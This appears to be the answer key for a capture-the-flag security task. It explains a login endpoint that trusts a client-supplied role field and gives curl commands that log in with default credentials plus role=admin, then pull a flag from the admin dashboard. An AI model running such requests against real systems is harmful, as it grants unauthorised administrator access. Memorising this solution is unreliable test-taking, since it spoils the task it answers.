# EXACT SOLUTION — FOLLOW THESE STEPS IN ORDER

Vulnerability: Privilege escalation via a client-controlled `role` field. `/login`
validates the password but then trusts the submitted `role` to set
`session['role']`. `/admin/dashboard` only checks `session['role'] == 'admin'`
(the 2FA step is cosmetic). So any valid account can become admin by sending
`role=admin`.

1. **Log in with a valid account but request `role=admin`** (default employee:
   `emp`/`password1`):

   ```
   curl -s -c cookies.txt -X POST http://<target>/login -d "username=emp&password=password1&role=admin"
   ```

2. **Fetch the admin dashboard** with that session:

   ```
   curl -s -b cookies.txt http://<target>/admin/dashboard
   ```

3. **Extract the flag** (`FLAG{...}`) from the dashboard and report it verbatim.
